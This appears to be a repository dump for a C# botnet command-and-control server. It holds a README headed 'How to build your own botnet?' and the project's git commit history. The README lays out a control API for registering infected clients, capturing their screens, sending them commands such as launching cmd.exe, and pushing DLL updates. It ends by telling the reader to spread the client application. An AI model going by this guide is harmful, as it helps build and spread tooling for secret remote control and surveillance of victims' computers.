@@ -1,0 +1,932 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+# BotNet-Server
+C# .Net BotNet Server and everything about it
+
+# Check my new project: https://github.com/Zerumi/AMWE-Server
+
+
+How to build your own botnet?
+- Create API
+- - You can use our API example, wrote on JS, or create yourself API
+- - - Warning! If you want to create your API, you must realize this methods (Every responses have JSON parsing)
+- - - Example Response (Type) is a Types of BotNet Server UI
+- - - - post /api/v1/screens/:id
+- - - - - Example Request: /api/v1/screens/0
+- - - - - Example Request Body: ScreenByte without sid
+- - - - - Example Response: sid for next request (uint)
+- - - - post /api/v1/screens/:id/:sid
+- - - - - Example Request: /api/v1/screens/0/0
+- - - - - Example Request Body: ScreenByte without sid
+- - - - - Example Response: void
+- - - - get /api/v1/screens/:id
+- - - - - Example Request: /api/v1/screens/0
+- - - - - Example Response: {"id":0, "screens":[{"sid":0, "bytes":[0,0,0,0,0,0...]}]} (Screen)
+- - - - get /api/v1/client
+- - - - - Example Request: /api/v1/client
+- - - - - Example Response: [{"id":0,"nameofpc":"PizhikCoder"},{"id":1,"nameofpc":"Zerumi"}] (IP[])
+- - - - get /api/v1/messages
+- - - - - Example Request: /api/v1/messages
+- - - - - Example Response: 1 (Uint) // count of messages
+- - - - get /api/v1/responses
+- - - - - Example Request: /api/v1/responses
+- - - - - Example Response: [{"id":0, "response":[{"rid":0,"response":"Done! Time used: 0ms"}]}, {...}] (Responses[])
+- - - - get /api/v1/messages/:id
+- - - - - Example Request: /api/v1/messages/0
+- - - - - Example Response: {"id":0,"command":"/start^cmd.exe","ids":["0","1","2","3","4","5","6"]} (Message)
+- - - - post /api/v1/client
+- - - - - Example Request: /api/v1/client
+- - - - - Example Request Body: IP without ID
+- - - - - Example Response: 0 (UInt) // Your ID in system
+- - - - post /api/v1/messages
+- - - - - Example Request: /api/v1/messages
+- - - - - Example Request Body: Message without ID
+- - - - - Example Response: {"id":0,"command":"/start^cmd.exe","ids":["0","1","2","3","4","5","6"]} (Message) // but this response is useless
+- - - - delete /api/v1/messages
+- - - - - Example Request: /api/v1/messages
+- - - - - Example Response: void
+- - - - get /api
+- - - - - Example Request: /api
+- - - - - Example Response: {"uri":" http://botnet-api.glitch.me/ ","version":1,"port":"3000","environment":"development","clients":1,"messages":1} (Info) // If version = 2, address in ApiRequest will be /api/v2/..., be careful
+- - - - get /api/v1/responses/:id/:rid
+- - - - - Example Request: /api/v1/responses/0/0
+- - - - - Example Response: {"rid":0, "response": "Done! Time used 0ms"} (Response)
+- - - - post /api/v1/responses/:id
+- - - - - Example Request: /api/v1/responses/0
+- - - - - Example Response: 1 (UInt) // count of responses
+- - - - delete /api/v1/responses
+- - - - - Example Request: /api/v1/responses
+- - - - - Example Response: void
+- - - - delete /api/v1/client/:id
+- - - - - Example Request: /api/v1/client/0
+- - - - - Example Response: void
+- - - - get /api/v1/admin/:password
+- - - - - Example Request: /api/v1/admin/qwerty
+- - - - - Example Response: false (Boolean)
+- - - - get /sandbox
+- - - - - Example Request: /sandbox
+- - - - - Example Response: "Who are you?" (String)
+- - - - get /sandbox/:id
+- - - - - Example Request: /sandbox/0
+- - - - - Example Response: 0 (UInt)
+- - - - post /api/v1/sandbox
+- - - - - Example Request: /api/v1/sandbox
+- - - - - Request Body: "Make a coffee" (String)
+- - - - - Example Response: Error (code 418)
+- - - - delete /sandbox
+- - - - - Example Request: /sandbox
+- - - - - Example Response: "Deleted!" (String)
+- - - - post /api/v1/update
+- - - - - Example Request: /api/v1/update
+- - - - - Example Request Body: UpdateFile
+- - - - - Example Response: void
+- - - - post /api/v1/nextupdate
+- - - - - Example Request: /api/v1/nextupdate
+- - - - - Example Request Body: UpdateFile without filename
+- - - - - Example Response: void
+- - - - get /api/v1/update
+- - - - - Example Request: /api/v1/update
+- - - - - Example Response: {"filename":"CommandHandler.dll","filebytes":[0,0,0,0,0,0,0,0...]} (UpdateFile)
+- - - - get /api/v1/support/versions/:version
+- - - - - Example Request: /api/v1/support/versions/1.6.0.0
+- - - - - Example Response: {"version":"1.6.0.0","isDeprecated":false,"isUpdateNeeded":false,"isNotLatest":false,"cmdlib":["2.1.0.0"],"m3md2":["1.3.0.0"],"m3md2_startup":["1.2.0.0"]} (VerifyVersion)
+- - Download API on a server
+- Create MineWeb API
+- - You can use our API example, wrote on JS, or create yourself API
+- - - Warning! If you want to create your API, you must realize this methods (Every responses have JSON parsing)
+- - - - get /scripts/:script
+- - - - post /scripts/:script
+- - - - delete /scripts/:script
+- - Download API on a server
+- Setup Client
+- - Example Client for http://botnet-api.glitch.me/ here: https://github.com/PizhikCoder/HttpClient
+- Setup Server UI
+- - In Login Screen write server address and password
+- - For change MineWeb address, go "Manage" -> "Settings" -> "API", and write MineWeb API address here
+All right. Now you need to spread client application.
+====================== GIT HISTORY: ======================
+6939a37 HEAD@{0}: clone: from https://github.com/Zerumi/BotNet-Server
+commit 6939a378d0282bb6793fb40e5bf8c6e918b8080a
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Thu Dec 22 01:40:38 2022 +0400
+
+    Update README.md
+
+commit bd0e14817ff717d5b4bf38c9452fe2dd57d75740
+Merge: 11482fd bc2677a
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Sat Dec 17 13:54:02 2022 +0300
+
+    Merge pull request #9 from Zerumi/dependabot/nuget/BotNet-Server-UI/Newtonsoft.Json-13.0.2
+    
+    Bump Newtonsoft.Json from 13.0.1 to 13.0.2 in /BotNet Server UI
+
+commit bc2677ac8d96f0c039c593ccf1ffbd3ed7c1e074
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Wed Dec 7 18:40:03 2022 +0000
+
+    Bump Newtonsoft.Json from 13.0.1 to 13.0.2 in /BotNet Server UI
+    
+    Bumps [Newtonsoft.Json](https://github.com/JamesNK/Newtonsoft.Json) from 13.0.1 to 13.0.2.
+    - [Release notes](https://github.com/JamesNK/Newtonsoft.Json/releases)
+    - [Commits](https://github.com/JamesNK/Newtonsoft.Json/compare/13.0.1...13.0.2)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: Newtonsoft.Json
+      dependency-type: direct:production
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 11482fda997467a9d4c7d5de76a886ba6fd8683a
+Merge: dc4e14a da460da
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Wed Dec 7 21:39:40 2022 +0300
+
+    Merge pull request #8 from Zerumi/dependabot/npm_and_yarn/Mineweb-API/qs-and-body-parser-and-express-6.11.0
+    
+    Bump qs, body-parser and express in /Mineweb API
+
+commit da460da868de8a0bcdb758d69e0d167a5700745b
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Wed Dec 7 09:44:28 2022 +0000
+
+    Bump qs, body-parser and express in /Mineweb API
+    
+    Bumps [qs](https://github.com/ljharb/qs) to 6.11.0 and updates ancestor dependencies [qs](https://github.com/ljharb/qs), [body-parser](https://github.com/expressjs/body-parser) and [express](https://github.com/expressjs/express). These dependencies need to be updated together.
+    
+    
+    Updates `qs` from 6.7.0 to 6.11.0
+    - [Release notes](https://github.com/ljharb/qs/releases)
+    - [Changelog](https://github.com/ljharb/qs/blob/main/CHANGELOG.md)
+    - [Commits](https://github.com/ljharb/qs/compare/v6.7.0...v6.11.0)
+    
+    Updates `body-parser` from 1.19.0 to 1.20.1
+    - [Release notes](https://github.com/expressjs/body-parser/releases)
+    - [Changelog](https://github.com/expressjs/body-parser/blob/master/HISTORY.md)
+    - [Commits](https://github.com/expressjs/body-parser/compare/1.19.0...1.20.1)
+    
+    Updates `express` from 4.17.1 to 4.18.2
+    - [Release notes](https://github.com/expressjs/express/releases)
+    - [Changelog](https://github.com/expressjs/express/blob/master/History.md)
+    - [Commits](https://github.com/expressjs/express/compare/4.17.1...4.18.2)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: qs
+      dependency-type: indirect
+    - dependency-name: body-parser
+      dependency-type: direct:production
+    - dependency-name: express
+      dependency-type: direct:production
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit dc4e14aa2a8f8ee68d2d80f759e38a10dce66af5
+Merge: 8ac499e d68150d
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Tue Nov 15 18:30:45 2022 +0300
+
+    Merge pull request #7 from Zerumi/dependabot/npm_and_yarn/Mineweb-API/minimatch-3.1.2
+    
+    Bump minimatch from 3.0.4 to 3.1.2 in /Mineweb API
+
+commit d68150d37b6ea6e8a571d4f84dcba928a9467c6d
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Sun Nov 13 14:45:07 2022 +0000
+
+    Bump minimatch from 3.0.4 to 3.1.2 in /Mineweb API
+    
+    Bumps [minimatch](https://github.com/isaacs/minimatch) from 3.0.4 to 3.1.2.
+    - [Release notes](https://github.com/isaacs/minimatch/releases)
+    - [Commits](https://github.com/isaacs/minimatch/compare/v3.0.4...v3.1.2)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: minimatch
+      dependency-type: indirect
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 8ac499e62a7cf60bdc0d9e5630de92fd9b1dd12a
+Merge: b20d264 f381b72
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Thu Jul 7 14:53:56 2022 +0400
+
+    Merge pull request #6 from Zerumi/dependabot/nuget/BotNet-Server-UI/Newtonsoft.Json-13.0.1
+    
+    Bump Newtonsoft.Json from 12.0.3 to 13.0.1 in /BotNet Server UI
+
+commit f381b72bd02f64c0befff4ec8743622d15b5fc35
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Wed Jun 22 22:04:55 2022 +0000
+
+    Bump Newtonsoft.Json from 12.0.3 to 13.0.1 in /BotNet Server UI
+    
+    Bumps [Newtonsoft.Json](https://github.com/JamesNK/Newtonsoft.Json) from 12.0.3 to 13.0.1.
+    - [Release notes](https://github.com/JamesNK/Newtonsoft.Json/releases)
+    - [Commits](https://github.com/JamesNK/Newtonsoft.Json/compare/12.0.3...13.0.1)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: Newtonsoft.Json
+      dependency-type: direct:production
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit b20d2649c03a919eab4f255a0d44400e8d09286e
+Merge: b568d1a 1b6d7b9
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Tue Aug 17 12:57:14 2021 +0400
+
+    Merge pull request #5 from Zerumi/dependabot/npm_and_yarn/Mineweb-API/path-parse-1.0.7
+    
+    Bump path-parse from 1.0.6 to 1.0.7 in /Mineweb API
+
+commit 1b6d7b97688fea0af3b6a21415e70ef02876aa1f
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Thu Aug 12 01:50:10 2021 +0000
+
+    Bump path-parse from 1.0.6 to 1.0.7 in /Mineweb API
+    
+    Bumps [path-parse](https://github.com/jbgutierrez/path-parse) from 1.0.6 to 1.0.7.
+    - [Release notes](https://github.com/jbgutierrez/path-parse/releases)
+    - [Commits](https://github.com/jbgutierrez/path-parse/commits/v1.0.7)
+    
+    ---
+    updated-dependencies:
+    - dependency-name: path-parse
+      dependency-type: indirect
+    ...
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit b568d1a6cb71442187a83f55892155bdf0b5921a
+Merge: 3869b6e 62e4d4d
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Thu Apr 22 17:15:27 2021 +0400
+
+    Merge pull request #4 from Zerumi/dependabot/nuget/BotNet-Server-UI/System.Text.Encodings.Web-4.7.2
+    
+    Bump System.Text.Encodings.Web from 4.7.1 to 4.7.2 in /BotNet Server UI
+
+commit 62e4d4de699814d1c919008181427d5cbc522e6d
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Wed Apr 21 19:44:48 2021 +0000
+
+    Bump System.Text.Encodings.Web from 4.7.1 to 4.7.2 in /BotNet Server UI
+    
+    Bumps [System.Text.Encodings.Web](https://github.com/dotnet/corefx) from 4.7.1 to 4.7.2.
+    - [Release notes](https://github.com/dotnet/corefx/releases)
+    - [Commits](https://github.com/dotnet/corefx/commits)
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 3869b6e546714964339355e2b1e2ebe7b0e5383a
+Merge: b1bb16f bf71c3c
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Wed Mar 3 11:37:03 2021 +0400
+
+    Merge pull request #3 from Zerumi/dependabot/npm_and_yarn/Mineweb-API/pug-3.0.1
+    
+    Bump pug from 2.0.4 to 3.0.1 in /Mineweb API
+
+commit bf71c3c842421815748c1d75f92d79bb2a7acc7a
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Wed Mar 3 05:01:11 2021 +0000
+
+    Bump pug from 2.0.4 to 3.0.1 in /Mineweb API
+    
+    Bumps [pug](https://github.com/pugjs/pug) from 2.0.4 to 3.0.1.
+    - [Release notes](https://github.com/pugjs/pug/releases)
+    - [Commits](https://github.com/pugjs/pug/compare/pug@2.0.4...pug@3.0.1)
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit b1bb16f84e1bafb85e5ba3cf554d689931f4b971
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Aug 31 00:27:54 2020 +0400
+
+    signalr part 1 (singalr will be realized in our next project...)
+
+commit 9592db3d44c8f52ddd1427a2cdc30d92f5085a07
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Aug 24 15:51:31 2020 +0400
+
+    listener added and websocket preparing
+
+commit 6e8febf17b819acb6c61e7c690f361b56308988f
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Aug 21 03:24:50 2020 +0400
+
+    GET, POST /api/screen added, DELETE /command & /response added
+
+commit 813e527aabd2d0ea7ebe70dbf8a794ff6093d254
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Aug 17 00:22:03 2020 +0400
+
+    Added application/json header to all api responses
+
+commit c6a330a71d574026f8fc6adfba00612dc8aa47f6
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Aug 16 23:46:47 2020 +0400
+
+    GET /api/support/versions & version note added
+
+commit 7e619f7e05595e5214877632dc008e33280921bd
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Aug 16 15:28:55 2020 +0400
+
+    Crypt algorithm and authorisation added to api, keysize now are 128
+
+commit de9d6f935dbaead7b1d184b31c3087a952fe119d
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Aug 16 00:09:18 2020 +0400
+
+    GET, POST /api/response added
+
+commit f8eab5106991bfb630ed60207d18749ea587e091
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Aug 15 18:20:50 2020 +0400
+
+    GET, POST /api/command added
+
+commit b511bd16d8e2f33fc5d80d9f81d39ef7c705b5a4
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Aug 12 03:06:26 2020 +0400
+
+    GET, POST, DELETE /api/client added
+
+commit 742ef36cf4bd9320faac021c5dba90fc6322091a
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Aug 11 21:02:48 2020 +0400
+
+    Crypt password on UI side added, js api removed, new ASP.NET Core api added
+
+commit 453db514a7b7f71c51fccbfc78a2b03c68902e8d
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Aug 10 21:22:50 2020 +0400
+
+    ColorTheme colors get optimized, Hackerman theme redrawn, Pinkerity theme deleted, settings apply button size increased
+
+commit 7fc9d49f70b099e89534e7a72ddecdb8bfe058b2
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Aug 10 01:40:54 2020 +0400
+
+    Dark theme added, color themes reworked, SetID window redrawn, font size fixed, custom message to UI added
+
+commit 49f7bf7fe08cc1bb2ca9aff64b247561898942e9
+Merge: 4819590 6c08fb6
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Aug 8 15:37:13 2020 +0400
+
+    Merge branch 'master' of https://github.com/Zerumi/BotNet-Server
+
+commit 4819590184741af31ded686e93ff0c9c2de5433e
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Aug 8 15:36:55 2020 +0400
+
+    settings window optimized
+
+commit 6c08fb6e3cd8f8f565dccb95983ac3f45662d521
+Merge: 385556f 53f81df
+Author: Zerumi <46845708+Zerumi@users.noreply.github.com>
+Date:   Mon Jul 27 01:56:11 2020 +0400
+
+    Merge pull request #1 from Zerumi/dependabot/npm_and_yarn/Mineweb-API/lodash-4.17.19
+    
+    Bump lodash from 4.17.15 to 4.17.19 in /Mineweb API
+
+commit 53f81df40ad7ad2e407d29aa014bc6a93847df1c
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Sun Jul 19 17:36:19 2020 +0000
+
+    Bump lodash from 4.17.15 to 4.17.19 in /Mineweb API
+    
+    Bumps [lodash](https://github.com/lodash/lodash) from 4.17.15 to 4.17.19.
+    - [Release notes](https://github.com/lodash/lodash/releases)
+    - [Commits](https://github.com/lodash/lodash/compare/4.17.15...4.17.19)
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 385556ff5dd1ffcbc4fa0ef1d12320c13355038d
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Jul 19 00:13:49 2020 +0400
+
+    Some perfomance improvments
+
+commit 3f5e143e4a8ec79b5b384d8b5f65abb8913cc15d
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Jul 15 20:49:52 2020 +0400
+
+    Response listener rewrited, fix long polling part 3, menuitem inf listen now working fine
+
+commit f64010974b3b6c4264a583a058e284cb015b8160
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Jul 13 17:24:40 2020 +0400
+
+    Fixed connecting to glitch server, listen responses temporarily disabled
+
+commit 35555247c8df53ab15888e70f5e290ac87bfe7c6
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Jun 11 15:13:04 2020 +0400
+
+    Fix long polling part 1, renamed some classes
+
+commit e8c4c690b2ddbbed9f08eb0656b5389099799b95
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat May 30 13:56:50 2020 +0400
+
+    Infinity listener removed, delete api/v1/client:id now removing this client from array, network visualiser fixed, api/v1/listen/... added, keep-alive connection added
+
+commit 56f5954c9032e6244882f3c3480cf27fbe6ed81e
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun May 24 19:08:38 2020 +0400
+
+    Api socket output added, Network error's handler added, exception handler added, screen demonstration part 1
+
+commit 38039bd0fd985edfa379c4810a5cf402c0775407
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Mar 26 14:12:33 2020 +0400
+
+    Release 1.6.0
+
+commit 7859562ed3cf28dd6d70b5d2e396ecf9f13952e5
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Mar 25 12:38:14 2020 +0400
+
+    ApiVersion switch added, command helper part 5.2
+
+commit 3ae0a134877379a662c051dae12acc62eb41b984
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Mar 24 18:45:01 2020 +0400
+
+    Show password letters added
+
+commit 1f1f47ddd7421fd5d13aa2328c70609c5271561e
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Mar 24 17:02:27 2020 +0400
+
+    command helper part 5.1
+
+commit 2c6a1880f1b0f4dd408c26047ccd08e73a40cc8a
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Mar 22 22:52:06 2020 +0400
+
+    Switch MineWeb API Address added
+
+commit 0832d50f1fe493b2afc42d87276d61316f910711
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Mar 18 22:45:04 2020 +0400
+
+    Switch server adress added
+
+commit 3e2493e620d49807ef968508f71b22e231ff7b29
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Mar 16 22:09:44 2020 +0400
+
+    mineweb api updated
+
+commit c3c58fb01dece9179e27486b161a557925a3d1ba
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Feb 29 00:30:43 2020 +0400
+
+    Release 1.5.0
+
+commit 21ea7834d4c08469d5d1ffef0f206898b83bac94
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Feb 29 00:26:24 2020 +0400
+
+    version check for UI added
+
+commit 6164f8d8a5bb06ccdc75096f312038d2f8da5b10
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Feb 28 23:21:50 2020 +0400
+
+    CommandInfo type name fixed, finally block of unlock buttons added
+
+commit 722e49ab8e52f46665a682d22f9cfebfcd1dc761
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Feb 28 16:44:23 2020 +0400
+
+    Mineweb API support for UI added, delete request updated
+
+commit be9765f9c80d3d0acdda7f81ba4a8c05d76cd043
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Feb 28 00:23:10 2020 +0400
+
+    Mineweb API: POST & DELETE scripts/:script added
+
+commit 86bcf8a25ea706a02c5518e3291a3502abd27a82
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Feb 27 23:40:17 2020 +0400
+
+    Mineweb API: GET scripts/:script added
+
+commit a5b4f92ccd0b0a095863820744e36ffe03564fa5
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Feb 26 21:47:24 2020 +0400
+
+    commands library assembly version updated
+
+commit a9f0283a6686f958401d3a872518e2b824fcb92b
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Feb 26 21:45:11 2020 +0400
+
+    Assembly Versions updated, dll checker part 2
+
+commit f586e8d935407d30e326dd5c9c6f9f7a43d8033b
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Feb 26 20:23:12 2020 +0400
+
+    dll checker added
+
+commit 678494e1448826d562f111c8f52a013d850a6784
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Feb 26 14:58:47 2020 +0400
+
+    Commands Library now support any FrameworkElement, fixed throwing an exception when copying/pasting similar command
+
+commit 823235a80af30bb5ab1f6d60a08b11eb8cc2a425
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Feb 14 13:06:22 2020 +0400
+
+    fixed auth window
+
+commit 00506bc312ccd3f941ca327009788b22e08603a5
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Feb 13 15:37:57 2020 +0400
+
+    fixed indexoutofrange ex in screens, fixed invalid ips send to api message
+
+commit e9f42bc80c69d05f6cc8edf370dd50d05591d5c9
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Jan 26 13:27:43 2020 +0400
+
+    Mineweb API added, command helper part 4.1
+
+commit 3d776a48eee39344b884f5ed1fc395cfc89eead5
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Jan 15 19:43:16 2020 +0400
+
+    send files added
+
+commit 407e24a97f7e0213ef766312cacec45cd332264f
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Jan 14 13:14:21 2020 +0400
+
+    Fixed send POST request on PC with proxy + Release 1.4.1
+
+commit a98efda68446e6283ab00f1dddcbe1ba677b10c6
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Jan 13 23:56:39 2020 +0400
+
+    GET & POST api/v1/update added
+
+commit 3e760d4bcc768c7a3cc512e3e8fa121415138d12
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Jan 3 13:48:19 2020 +0400
+
+    Release 1.4.0
+
+commit 3b665e54023d0b9117e3aaffc625bba4b8db2909
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Jan 3 13:31:36 2020 +0400
+
+    add ignore big log warning, diagnostic api added, log panel for auth dialog box added, sandbox api added
+
+commit 676ff8852d010a74f9ba6dd4f11c4a2b61475014
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Jan 1 22:33:55 2020 +0400
+
+    Full logging for mainwindow added, all diagnostic windows created, appinfo added, exceptionhandler added
+
+commit bcb5b1c128dbadafcbe489a0527c615100a59b55
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Jan 1 15:38:11 2020 +0400
+
+    try to fix uncontrol listen log in diagnostic2
+
+commit bf1fb42793f40f40309687fbe003b97f088ecabd
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Dec 31 19:11:34 2019 +0400
+
+    Diagnostic2 window redrawn, full logpanel part 1.2 (mainwindow)
+
+commit b7358d721daddb7c21da80a8ec71eb01c34a47d6
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Dec 30 23:33:42 2019 +0400
+
+    Full LogPanel part 1.1 (MainWindow)
+
+commit 191874b551a9bd1edb1a8687995dd12b0a7935e6
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Dec 30 21:41:20 2019 +0400
+
+    Apply click on color theme change now reload program without enter password, color themes changed
+
+commit b758d26068c5ebc3ec92ca27c880844883fdc79f
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Wed Dec 25 22:38:04 2019 +0400
+
+    ColorTheme change finally added, InfinityListener switcher included to the app.config, first ColorThemes added
+
+commit d84487093eba9f043134e523fcd1d77f89e58195
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Dec 24 23:52:22 2019 +0400
+
+    ColorTheme change main part added, settings methods moved to the BotNet_Server_UI
+
+commit 9a7e2b414952d96e1271143017b9e7bc28d0b2a3
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Dec 23 21:26:52 2019 +0400
+
+    StaticVars moved to m3md2 (new dll), settings window added, color theme change preparation part 2, listen loops now can break, new menu item
+
+commit 4e924451e9eb8baa7a2073728a070942fab83be5
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Dec 20 18:06:01 2019 +0400
+
+    app control .dll added, colortheme change preparation
+
+commit 0b986f52d0c3902f1644543aa6169d30e1d1a441
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Dec 19 23:02:40 2019 +0400
+
+    StackPanel changed to MenuItems (all controls moved to menu), Command helper part 3, status bar part 2
+
+commit b4851a1dec8ca5d76b8204f50a2285508c8cf28d
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Dec 17 21:18:31 2019 +0400
+
+    screenviewer redrawed, screen saver added, info label returned, perfomance counter red color added
+
+commit 9290f1f05bab57dc3f3ee05295399f5d20e4511d
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Dec 16 23:21:05 2019 +0400
+
+    status bar part 1 added
+
+commit b4a3d42ede2ad566eeec89eac0eee77cf4c3455e
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Dec 16 18:25:33 2019 +0400
+
+    perfomance counter added
+
+commit 865345cf1d7f500c2fb3ed3a6be49bf7489076e4
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Dec 15 21:58:08 2019 +0400
+
+    ID control label added
+
+commit 013f300c9354cca68d8781ed56dd120db65594b0
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Dec 15 20:50:00 2019 +0400
+
+    migrate from ip to id
+
+commit 7a617cfe675c633e851cd883d2c3fd51e80d3485
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Dec 15 19:13:18 2019 +0400
+
+    Api optimized
+
+commit 55aa660d4be701eddac344caa0ee630de58fe959
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Dec 15 18:50:55 2019 +0400
+
+    Image Scroll fixed + Release 1.3.1
+
+commit f5b756107d4c86b8920145ca062ebdb945947f77
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Dec 15 15:58:41 2019 +0400
+
+    Release 1.3.0
+
+commit d54b5329c2425a2f28fc04a57d9e49f5a197a260
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Dec 15 15:52:04 2019 +0400
+
+    TaskCanceledException auto-reload added, api fixed, MainWindow close event added
+
+commit db933a6848e8c4a7e1b609392ba1f7ea3bd26395
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Dec 14 23:07:50 2019 +0400
+
+    up screen quality part 1
+
+commit 4e07db1f3a85b8fab9d13fcdac010459e2ff97b3
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sat Dec 14 20:31:09 2019 +0400
+
+    null ip send fixed, dynamic argument type added, screen viewer fixed
+
+commit ca807daeeb4164a49a91fbda0d455dde368e3bc8
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Dec 13 20:22:12 2019 +0400
+
+    Screen panel fixed, (not tested) ImageViewer, API fixes
+
+commit f27c9f7f98a2d1c125502e1b709dd7921f3a6b5a
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Thu Dec 12 22:24:11 2019 +0400
+
+    (not tested) screen handler added
+
+commit c3dcbe4518ba203053b086ed0b2cf4b5dc2167e2
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Tue Dec 10 19:14:23 2019 +0400
+
+    UI screen support, POST /api/v1/screens & GET /api/v1/screens/:id added
+
+commit 4a57160b68ba7eae4b64791065bc36be122767c0
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Mon Dec 9 19:39:19 2019 +0400
+
+    Screens panel redrawn, UI command helper fixed
+
+commit 9b3f60da2614419b2ac26afe2d1e0fdaed84fd9b
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Sun Dec 8 17:16:18 2019 +0400
+
+    UI redrawn
+
+commit 0834c590c648b06fb1435e93d8ff4e3c8e55605d
+Author: Zerumi <evgexa.2015@bk.ru>
+Date:   Fri Dec 6 22:50:35 2019 +0400
+
